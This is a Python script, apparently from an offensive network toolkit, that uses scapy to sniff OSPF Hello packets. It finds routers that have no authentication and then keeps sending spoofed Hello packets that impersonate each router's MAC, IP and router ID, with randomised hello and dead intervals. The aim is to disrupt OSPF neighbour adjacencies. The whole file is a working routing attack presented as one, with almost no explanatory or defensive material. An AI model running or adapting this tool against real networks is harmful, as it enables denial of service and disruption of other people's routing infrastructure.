import time
from scapy.all import *
from scapy.contrib.ospf import OSPF_Hdr, OSPF_Hello, OSPF_Link, OSPF_LLS_Hdr
from colorama import *


def ospf_hello_manipulation(interface):
    try:
        print(Fore.YELLOW + f"    [!] Detecting OSPF routers...")  # Переведено
        global total, router_count, ospf_hello_captured
        ospf_routers = {}
        ospf_hello_captured = False  # Не захвачен
        router_count = 1
        total = 0

        def packet_analyze(packet):
            global target_mac, target_ip, mask, version, area, router_id, hello_inter, dead_inter, options, total, router_count, ospf_hello_captured, auth
            if packet.haslayer(OSPF_Hdr) and packet[OSPF_Hdr].type == 1:  # Если это OSPF Hello
                target_mac = packet[Ether].src
                target_ip = packet[IP].src
                src_mac = packet[Ether].src
                src_ip = packet[IP].src
                area = packet[OSPF_Hdr].area
                mask = packet[OSPF_Hello].mask
                version = packet[OSPF_Hdr].version
                router_id = packet[OSPF_Hdr].src
                hello_inter = packet[OSPF_Hdr].hellointerval
                dead_inter = packet[OSPF_Hdr].deadinterval
                auth = packet[OSPF_Hdr].authtype
                dr = packet[OSPF_Hello].router
                bdr = packet[OSPF_Hello].backup
                neighbors = packet[OSPF_Hello].neighbors
                if auth == 0:
                    auth = "None"
                    if version != 3:
                        ospf_hello_captured = True
                else:
                    auth = "Yes"
                options = packet[OSPF_Hello].options  # N и E - критичные флаги для установления соседства
                if (options >> 3) & 1:  # Если есть флаг N (он один или еще какой-либо флаг)
                    options = 0x08  # N флаг (NSSA)
                    output_options = "NSSA"
                elif options == 0x00:  # Нет ни одного флага (Stub / Totally Stub)
                    options = 0x00  # Stub / Totally Stub
                    output_options = "Stub / Totally Stub"
                else:
                    options = 0x02  # E флаг
                    output_options = "Standard"

                if src_mac in [router["MAC"] for router in ospf_routers.values()]:
                    pass
                else:
                    if version != 3 and auth == "None":  # Если версия не 3 и нет аутентификации
                        ospf_routers[f"Router{router_count}"] = {"MAC": src_mac, "IP": src_ip, "Area": area,
                                                                 "Mask": mask, "Version": version, "Router ID": router_id,
                                                                 "Hello Interval": hello_inter, "Dead Interval": dead_inter, "Auth": auth,
                                                                 "Options": options, "DR": dr, "BDR": bdr, "Neighbors": neighbors}
                        router_count += 1
                        print(Fore.GREEN + f"\n    [+] [OSPF Router detected]\n         MAC: {src_mac.upper()}\n         IP: {src_ip}\n         Mask: {mask}\n"
                                           f"         Area: {area}\n         Area Type: {output_options}\n         Router ID: {router_id}\n         Hello Interval: {hello_inter}\n"
                                           f"         Dead Interval: {dead_inter}\n         Auth: {auth}\n         Version: {version}")  # Переведено
                    else:
                        if version == 3 and auth == "Yes":  # Если версия 3 и есть аутентификация
                            ospf_routers[f"Router{router_count}"] = {"MAC": src_mac, "IP": src_ip, "Area": area,
                                                                     "Mask": mask, "Version": version,
                                                                     "Router ID": router_id,
                                                                     "Hello Interval": hello_inter,
                                                                     "Dead Interval": dead_inter, "Auth": auth,
                                                                     "Options": options}
                            router_count += 1
                            print(Fore.GREEN + f"\n    [+] [OSPF Router detected]\n         MAC: {src_mac.upper()}\n         IP: {src_ip}\n         Mask: {mask}\n"
                                             f"         Area: {area}\n         Area Type: {output_options}\n         Router ID: {router_id}\n         Hello Interval: {hello_inter}\n"
                                             f"         Dead Interval: {dead_inter}\n         Auth: {auth}{Fore.RED} (Temporarily unsupported)\n"
                                             f"         {Fore.GREEN}Version: {version}{Fore.RED} (Temporarily unsupported)")  # Переведено
                        if version == 3 and auth == "None":  # Если версия 3 и нет аутентификации
                            ospf_routers[f"Router{router_count}"] = {"MAC": src_mac, "IP": src_ip, "Area": area,
                                                                     "Mask": mask, "Version": version,
                                                                     "Router ID": router_id,
                                                                     "Hello Interval": hello_inter,
                                                                     "Dead Interval": dead_inter, "Auth": auth,
                                                                     "Options": options}
                            router_count += 1
                            print(Fore.GREEN + f"\n    [+] [OSPF Router detected]\n         MAC: {src_mac.upper()}\n         IP: {src_ip}\n         Mask: {mask}\n"
                                             f"         Area: {area}\n         Area Type: {output_options}\n         Router ID: {router_id}\n         Hello Interval: {hello_inter}\n"
                                             f"         Dead Interval: {dead_inter}\n         Auth: {auth}\n"
                                             f"         Version: {version}{Fore.RED} (Temporarily unsupported)")  # Переведено
                        if version != 3 and auth == "Yes":  # Если версия не 3 и есть аутентификация
                            ospf_routers[f"Router{router_count}"] = {"MAC": src_mac, "IP": src_ip, "Area": area,
                                                                     "Mask": mask, "Version": version,
                                                                     "Router ID": router_id,
                                                                     "Hello Interval": hello_inter,
                                                                     "Dead Interval": dead_inter, "Auth": auth,
                                                                     "Options": options}
                            router_count += 1
                            print(Fore.GREEN + f"\n    [+] [OSPF Router detected]\n         MAC: {src_mac.upper()}\n         IP: {src_ip}\n         Mask: {mask}\n"
                                             f"         Area: {area}\n         Area Type: {output_options}\n         Router ID: {router_id}\n         Hello Interval: {hello_inter}\n"
                                             f"         Dead Interval: {dead_inter}\n         Auth: {auth}{Fore.RED} (Temporarily unsupported)\n"
                                             f"         {Fore.GREEN}Version: {version}")  # Переведено

        sniffer = AsyncSniffer(filter="ip proto 89", iface=interface, prn=packet_analyze, timeout=20)
        sniffer.start()
        time.sleep(21)

        if ospf_hello_captured == True:
            if auth == "None":  # Если аутентификации нет
                print(Fore.GREEN + f"\n    [+] Attack is running... (Press Ctrl + C to Stop)")  # Переведено
                try:
                    while True:
                        for router in ospf_routers:
                            mac_address = ospf_routers[router]['MAC']
                            ip_address = ospf_routers[router]['IP']
                            area = ospf_routers[router]['Area']
                            version = ospf_routers[router]['Version']
                            mask = ospf_routers[router]['Mask']
                            options = ospf_routers[router]['Options']
                            rid = ospf_routers[router]['Router ID']
                            dr = ospf_routers[router]['DR']
                            bdr = ospf_routers[router]['BDR']
                            neighbors = ospf_routers[router]['Neighbors']


                            fake_hello_packet = Ether(src=mac_address, dst="01:00:5e:00:00:05") / \
                                                IP(src=ip_address, dst="224.0.0.5", ttl=1) / \
                                                OSPF_Hdr(version=version, type=1, src=rid, area=area) / \
                                                OSPF_Hello(mask=mask, hellointerval=random.randint(1, 20),
                                                           options=options, prio=1,
                                                           deadinterval=random.randint(4, 80),
                                                           router=dr, backup=bdr, neighbors=neighbors)

                            sendp(fake_hello_packet, iface=interface, count=1, verbose=False)
                            total += 1
                            print(Fore.GREEN + f"    [+] Sent spoofed OSPF Hello packets with manipulated parameters: {total}", end="\r")  # Переведено
                        time.sleep(2)

                except KeyboardInterrupt:
                    print(Fore.YELLOW + f"\n\n    [!] Attack stopped (User pressed Ctrl + C)")  # Переведено

            else:  # Если аутентификация есть
                print(Fore.RED + f"\n    [-] %ERROR: No OSPF routers detected (attack aborted)")  # Переведено

        else:
            print(Fore.RED + f"    [-] %ERROR: No OSPF routers detected (attack aborted)")  # Переведено

    except KeyboardInterrupt:
        print(Fore.YELLOW + f"\n    [!] Attack stopped (User pressed Ctrl + C)")  # Переведено